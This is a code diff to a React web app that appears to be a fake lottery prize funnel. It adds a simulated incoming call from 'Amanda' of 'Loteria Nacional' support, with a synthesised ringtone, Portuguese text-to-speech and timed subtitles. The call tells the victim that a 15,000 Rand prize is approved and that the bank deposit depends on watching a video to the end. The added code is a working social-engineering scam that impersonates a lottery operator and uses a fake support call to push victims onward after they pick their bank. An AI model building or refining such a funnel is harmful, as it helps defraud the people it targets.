@@ -1,5 +1,6 @@
 import React, { useState, useEffect, useRef } from 'react';
 import logo from './assets/lottery-logo.png';
+import supportAgentImg from './assets/support-agent.png';
 
 // Global Data
 const PRIZES = [
@@ -577,6 +578,323 @@ function LiveChat() {
 }
 
 
+const SUBTITLES = [
+  { text: "Olá! Tudo bem? Sou a Amanda, do suporte da Loteria Nacional. Meus parabéns!", start: 0, end: 4500 },
+  { text: "Estou ligando para confirmar que seu prêmio de 15.000 Rands foi aprovado e já está pronto para ser transferido!", start: 4500, end: 10000 },
+  { text: "Para liberar o depósito agora mesmo na sua conta bancária, você só precisa assistir ao vídeo explicativo que está na sua tela.", start: 10000, end: 16000 },
+  { text: "Assista ao vídeo até o final para que o nosso sistema conclua o envio automático e seguro dos seus 15.000 Rands.", start: 16000, end: 22000 },
+  { text: "É muito rápido e garantido. Vou te redirecionar para o vídeo agora mesmo. Um abraço e boa sorte!", start: 22000, end: 27500 }
+];
+
+function CallStep({ name, prize, onCallEnded }) {
+  const [isCallActive, setIsCallActive] = useState(false);
+  const [callEnded, setCallEnded] = useState(false);
+  const [timer, setTimer] = useState(0);
+  const [currentSubtitle, setCurrentSubtitle] = useState("");
+  const audioCtxRef = useRef(null);
+
+  // Synthesize telephone ringing sound
+  useEffect(() => {
+    let ringInterval = null;
+    let currentOsc1 = null;
+    let currentOsc2 = null;
+    let currentGain = null;
+
+    if (!isCallActive && !callEnded) {
+      const playRing = () => {
+        try {
+          const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+          if (!AudioContextClass) return;
+          if (!audioCtxRef.current) {
+            audioCtxRef.current = new AudioContextClass();
+          }
+          const ctx = audioCtxRef.current;
+          if (ctx.state === 'suspended') {
+            ctx.resume();
+          }
+
+          const osc1 = ctx.createOscillator();
+          const osc2 = ctx.createOscillator();
+          const gain = ctx.createGain();
+
+          osc1.type = 'sine';
+          osc1.frequency.setValueAtTime(400, ctx.currentTime);
+          osc2.type = 'sine';
+          osc2.frequency.setValueAtTime(450, ctx.currentTime);
+
+          gain.gain.setValueAtTime(0, ctx.currentTime);
+          gain.gain.linearRampToValueAtTime(0.15, ctx.currentTime + 0.1);
+          gain.gain.setValueAtTime(0.15, ctx.currentTime + 1.2);
+          gain.gain.linearRampToValueAtTime(0, ctx.currentTime + 1.4);
+
+          osc1.connect(gain);
+          osc2.connect(gain);
+          gain.connect(ctx.destination);
+
+          osc1.start();
+          osc2.start();
+
+          currentOsc1 = osc1;
+          currentOsc2 = osc2;
+          currentGain = gain;
+
+          setTimeout(() => {
+            try {
+              osc1.stop();
+              osc2.stop();
+              osc1.disconnect();
+              osc2.disconnect();
+              gain.disconnect();
+            } catch (e) {}
+          }, 1500);
+        } catch (e) {
+          console.error(e);
+        }
+      };
+
+      playRing();
+      ringInterval = setInterval(playRing, 3500);
+    }
+
+    return () => {
+      if (ringInterval) clearInterval(ringInterval);
+      try {
+        if (currentOsc1) currentOsc1.stop();
+        if (currentOsc2) currentOsc2.stop();
+      } catch (e) {}
+    };
+  }, [isCallActive, callEnded]);
+
+  // Handle active call timer and speech
+  useEffect(() => {
+    if (!isCallActive) return;
+
+    // Start timer increment
+    const interval = setInterval(() => {
+      setTimer(prev => prev + 100);
+    }, 100);
+
+    // Speak voice message
+    const speechText = "Olá! Tudo bem? Sou a Amanda, do suporte da Loteria Nacional. Meus parabéns! Estou ligando para confirmar que seu prêmio de 15.000 Rands foi aprovado e já está pronto para ser transferido! Para liberar o depósito agora mesmo na sua conta bancária, você só precisa assistir ao vídeo explicativo que está na sua tela. Assista ao vídeo até o final para que o nosso sistema conclua o envio automático e seguro dos seus 15.000 Rands. É muito rápido e garantido. Vou te redirecionar para o vídeo agora mesmo. Um abraço e boa sorte!";
+    
+    if (typeof window !== "undefined" && window.speechSynthesis) {
+      window.speechSynthesis.cancel();
+      const utterance = new SpeechSynthesisUtterance(speechText);
+      utterance.lang = "pt-BR";
+      
+      const voices = window.speechSynthesis.getVoices();
+      const ptVoice = voices.find(v => v.lang.startsWith("pt"));
+      if (ptVoice) {
+        utterance.voice = ptVoice;
+      }
+      utterance.rate = 1.0;
+      utterance.pitch = 1.0;
+      window.speechSynthesis.speak(utterance);
+    }
+
+    return () => {
+      clearInterval(interval);
+      if (typeof window !== "undefined" && window.speechSynthesis) {
+        window.speechSynthesis.cancel();
+      }
+    };
+  }, [isCallActive]);
+
+  // Subtitle timing mapping
+  useEffect(() => {
+    if (!isCallActive) return;
+
+    const match = SUBTITLES.find(sub => timer >= sub.start && timer < sub.end);
+    if (match) {
+      setCurrentSubtitle(match.text);
+    } else if (timer >= 27500) {
+      handleEndCall(true);
+    }
+  }, [timer, isCallActive]);
+
+  // Play disconnect sound
+  function playBeep(frequency, duration, ctx) {
+    try {
+      const osc = ctx.createOscillator();
+      const gain = ctx.createGain();
+      osc.type = "sine";
+      osc.frequency.setValueAtTime(frequency, ctx.currentTime);
+      gain.gain.setValueAtTime(0, ctx.currentTime);
+      gain.gain.linearRampToValueAtTime(0.1, ctx.currentTime + 0.02);
+      gain.gain.setValueAtTime(0.1, ctx.currentTime + duration - 0.02);
+      gain.gain.linearRampToValueAtTime(0, ctx.currentTime + duration);
+      osc.connect(gain);
+      gain.connect(ctx.destination);
+      osc.start();
+      osc.stop(ctx.currentTime + duration);
+    } catch (e) {}
+  }
+
+  function handleEndCall(autoNext = false) {
+    if (callEnded) return;
+    setCallEnded(true);
+    setIsCallActive(false);
+
+    if (typeof window !== "undefined" && window.speechSynthesis) {
+      window.speechSynthesis.cancel();
+    }
+
+    // Play Hangups beeps
+    try {
+      const AudioContextClass = window.AudioContext || window.webkitAudioContext;
+      if (AudioContextClass) {
+        const ctx = audioCtxRef.current || new AudioContextClass();
+        playBeep(425, 0.15, ctx);
+        setTimeout(() => playBeep(425, 0.15, ctx), 250);
+        setTimeout(() => playBeep(425, 0.15, ctx), 500);
+      }
+    } catch (e) {}
+
+    // Wait a brief moment to finish the beeps, then transition
+    setTimeout(() => {
+      onCallEnded();
+    }, 1000);
+  }
+
+  function handleAcceptCall() {
+    setIsCallActive(true);
+    try {
+      if (audioCtxRef.current && audioCtxRef.current.state === 'suspended') {
+        audioCtxRef.current.resume();
+      }
+    } catch (e) {}
+  }
+
+  const seconds = Math.floor(timer / 1000);
+  const m = String(Math.floor(seconds / 60)).padStart(2, '0');
+  const s = String(seconds % 60).padStart(2, '0');
+  const formattedTime = `${m}:${s}`;
+
+  return (
+    <main className="max-w-md mx-auto px-4 py-8 flex-1 flex flex-col justify-center items-center">
+      <div className="w-full bg-[#111116] text-white rounded-3xl overflow-hidden shadow-2xl relative flex flex-col justify-between aspect-[9/16] min-h-[580px] p-6 border border-white/10">
+        <div className="absolute inset-0 bg-gradient-to-b from-[#1c1c24]/50 via-transparent to-[#111116] pointer-events-none z-0"></div>
+
+        {!isCallActive ? (
+          <div className="flex-1 flex flex-col justify-between items-center z-10 py-6 animate-in fade-in duration-500">
+            <div className="text-center mt-6">
+              <span className="bg-[#0e8a3a]/20 text-[#2ecc71] text-[10px] uppercase font-bold tracking-widest px-3 py-1 rounded-full border border-[#0e8a3a]/30">
+                Chamada Segura
+              </span>
+              <h2 className="text-xl font-extrabold mt-3 tracking-tight">Suporte Loteria Nacional</h2>
+              <p className="text-xs text-gray-400 mt-1 font-mono">+27 0861 101 101</p>
+              <p className="text-sm text-[#2ecc71] font-semibold mt-3 animate-pulse">Chamando...</p>
+            </div>
+
+            <div className="my-auto relative">
+              <div className="absolute inset-[-10px] rounded-full border-2 border-[#1d4ea8]/20 animate-ping duration-1000"></div>
+              <div className="absolute inset-[-20px] rounded-full border border-[#1d4ea8]/10 animate-ping duration-1500"></div>
+              <img 
+                src={supportAgentImg} 
+                alt="Amanda - Suporte" 
+                className="w-36 h-36 rounded-full object-cover border-4 border-[#1d4ea8] shadow-lg relative z-10" 
+              />
+            </div>
+
+            <div className="w-full flex items-center justify-around px-4 mb-6">
+              <button 
+                onClick={() => handleEndCall()}
+                className="flex flex-col items-center gap-2 group cursor-pointer"
+              >
+                <span className="w-14 h-14 bg-[#e30613] hover:bg-[#b80510] active:scale-95 transition-all rounded-full flex items-center justify-center shadow-lg shadow-red-900/40">
+                  <svg className="w-6 h-6 text-white rotate-[135deg]" fill="currentColor" viewBox="0 0 24 24">
+                    <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/>
+                  </svg>
+                </span>
+                <span className="text-[10px] text-gray-400 font-semibold group-hover:text-white">Recusar</span>
+              </button>
+
+              <button 
+                onClick={handleAcceptCall}
+                className="flex flex-col items-center gap-2 group cursor-pointer"
+              >
+                <div className="relative">
+                  <span className="absolute inset-0 bg-[#0e8a3a] rounded-full animate-ping opacity-35 duration-1000"></span>
+                  <span className="w-14 h-14 bg-[#0e8a3a] hover:bg-[#0a6e2c] active:scale-95 transition-all rounded-full flex items-center justify-center shadow-lg shadow-green-900/40 relative z-10">
+                    <svg className="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 24 24">
+                      <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/>
+                    </svg>
+                  </span>
+                </div>
+                <span className="text-[10px] text-gray-400 font-semibold group-hover:text-white">Atender</span>
+              </button>
+            </div>
+          </div>
+        ) : (
+          <div className="flex-1 flex flex-col justify-between items-center z-10 py-6 animate-in zoom-in duration-500">
+            <div className="text-center mt-4">
+              <h2 className="text-lg font-bold">Amanda</h2>
+              <p className="text-xs text-gray-400 mt-0.5">Suporte Nacional</p>
+              <p className="text-xs font-mono text-[#2ecc71] mt-1.5 font-bold tracking-wider">{formattedTime}</p>
+            </div>
+
+            <div className="flex flex-col items-center my-auto">
+              <div className="relative">
+                <img 
+                  src={supportAgentImg} 
+                  alt="Amanda - Suporte" 
+                  className="w-28 h-28 rounded-full object-cover border-2 border-white/20 shadow-md" 
+                />
+                <div className="absolute -bottom-1 -right-1 bg-[#0e8a3a] text-white rounded-full p-1 border-2 border-[#111116]">
+                  <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 24 24">
+                    <path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/>
+                  </svg>
+                </div>
+              </div>
+
+              <div className="flex items-end justify-center gap-1 h-6 mt-4">
+                <span className="w-1 bg-[#2ecc71] rounded-full" style={{ height: '60%', animation: 'bounce 0.8s infinite alternate' }}></span>
+                <span className="w-1 bg-[#2ecc71] rounded-full" style={{ height: '30%', animation: 'bounce 0.5s infinite alternate 0.1s' }}></span>
+                <span className="w-1 bg-[#2ecc71] rounded-full" style={{ height: '90%', animation: 'bounce 0.9s infinite alternate 0.2s' }}></span>
+                <span className="w-1 bg-[#2ecc71] rounded-full" style={{ height: '40%', animation: 'bounce 0.6s infinite alternate 0.15s' }}></span>
+                <span className="w-1 bg-[#2ecc71] rounded-full" style={{ height: '70%', animation: 'bounce 0.7s infinite alternate 0.05s' }}></span>
+              </div>
+            </div>
+
+            <div className="w-full bg-black/40 border border-white/10 backdrop-blur-md rounded-xl p-3 min-h-[90px] flex items-center justify-center text-center px-4 my-4">
+              <p className="text-xs leading-relaxed text-gray-200 font-medium">
+                {currentSubtitle || "Iniciando conversa..."}
+              </p>
+            </div>
+
+            <div className="w-full flex flex-col items-center gap-3">
+              <button 
+                onClick={() => handleEndCall()}
+                className="flex flex-col items-center gap-2 group cursor-pointer"
+              >
+                <span className="w-14 h-14 bg-[#e30613] hover:bg-[#b80510] active:scale-95 transition-all rounded-full flex items-center justify-center shadow-lg shadow-red-900/40">
+                  <svg className="w-6 h-6 text-white rotate-[135deg]" fill="currentColor" viewBox="0 0 24 24">
+                    <path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/>
+                  </svg>
+                </span>
+                <span className="text-[10px] text-gray-400 font-semibold group-hover:text-white">Desligar</span>
+              </button>
+
+              <button 
+                onClick={() => handleEndCall()} 
+                className="text-[11px] text-[#2ecc71] hover:text-[#58d68d] hover:underline transition-all mt-1"
+              >
+                Pular para o Vídeo →
+              </button>
+            </div>
+          </div>
+        )}
+      </div>
+      <style dangerouslySetInnerHTML={{__html: `
+        @keyframes bounce {
+          0% { height: 20%; }
+          100% { height: 100%; }
+        }
+      `}} />
+    </main>
+  );
+}
+
 function VslStep({ name, bank, prize }) {
   const playerRef = useRef(null);
   const bankDetails = BANKS.find(b => b.name === bank);
@@ -634,7 +952,7 @@ function VslStep({ name, bank, prize }) {
 
 
 export default function App() {
-  const [step, setStep] = useState("prizes"); // prizes, spin, bank, processing, approved, vsl
+  const [step, setStep] = useState("prizes"); // prizes, spin, bank, processing, approved, call, vsl
   const [name, setName] = useState("");
   const [phone, setPhone] = useState("");
   const [selectedPrize, setSelectedPrize] = useState(null);
@@ -709,7 +1027,15 @@ export default function App() {
             bank={selectedBank}
             name={name}
             prize={WINNING_PRIZE}
-            onContinue={() => setStep("vsl")}
+            onContinue={() => setStep("call")}
+          />
+        )}
+        
+        {step === "call" && (
+          <CallStep 
+            name={name}
+            prize={WINNING_PRIZE}
+            onCallEnded={() => setStep("vsl")}
           />
         )}
         
